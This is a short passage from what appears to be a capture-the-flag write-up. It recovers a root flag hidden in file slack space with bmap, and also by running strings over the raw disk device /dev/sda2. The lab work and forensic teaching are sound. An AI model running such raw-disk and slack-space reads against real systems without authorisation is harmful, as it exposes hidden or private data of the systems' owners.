From a forensic perspective, there is a <a href="https://github.com/CameronLonsdale/bmap">GitHub repository</a> which utilizes slack space in blocks to hide data (one of many interesting functions to the forensic community this tool can perform).

In our Linux file system, we have a _root.txt_ which contains 52 characters (52 bytes) from a total of 4096 bytes (4kb) block size. This means that slack space consists of 4044 bytes in which data can be hidden and not seen from tools such as `cat`. Because `bmap` is installed (which is the hint for the slack space technique), we are able to retrieve the root flag by showing slack space content:

{% highlight console %}
# bmap --mode slack root.txt
getting from block 1646490
file size was: 52
slack size: 4044
block size: 4096
68c874...
{% endhighlight %}

<u>Note</u>: Root flag can also be found by digging file system's offsets around the _root.txt_ file, or even easier:  
{% highlight console %}
# strings /dev/sda2 | grep -A1 "Mine deeper to get rewarded with root coin (RTC)..."
Mine deeper to get rewarded with root coin (RTC)...
68c874...
{% endhighlight %}

<i>[Go back to homepage](../)</i>
